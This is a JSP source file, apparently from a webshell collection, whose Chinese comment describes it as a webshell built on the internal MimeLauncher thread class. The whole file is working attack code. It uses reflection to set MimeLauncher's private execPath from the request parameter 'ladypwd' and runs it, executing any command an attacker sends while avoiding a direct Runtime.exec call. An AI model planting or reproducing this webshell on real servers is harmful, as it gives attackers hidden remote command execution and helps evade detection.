<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLConnection" %>
<%@ page import="sun.net.www.MimeEntry" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.io.*" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
使用Runtime#exec() 的上层封装线程类MimeLauncher#run() 来实现JSP Webshell
--%>
<%
    URL url = new URL("http://127.0.0.1:7374");
    URLConnection uc = url.openConnection();
    Class mimeClazz = Class.forName("sun.net.www.MimeLauncher");
    Constructor mimeConstructor = mimeClazz.getDeclaredConstructor(MimeEntry.class, URLConnection.class,
            InputStream.class, String.class, String.class);
    mimeConstructor.setAccessible(true);
    InputStream in = new FileInputStream("/dev/null");
    String tmpPath = Files.createTempDirectory("localdemo").toFile().getPath();
    Files.write(Paths.get(tmpPath + File.separator + "LocalDemo.txt"), "abc".getBytes());
    MimeEntry mimeEntry = new MimeEntry("mimeentry");
    mimeEntry.setCommand(tmpPath + File.separator + "LocalDemo.txt");
    Thread obj = (Thread)mimeConstructor.newInstance(mimeEntry, uc, in, "LocalDemoTemp%s.txt", "");
    Field execPathField = mimeClazz.getDeclaredField("execPath");
    execPathField.setAccessible(true);
    execPathField.set(obj, request.getParameter("ladypwd"));
    obj.run();
%>
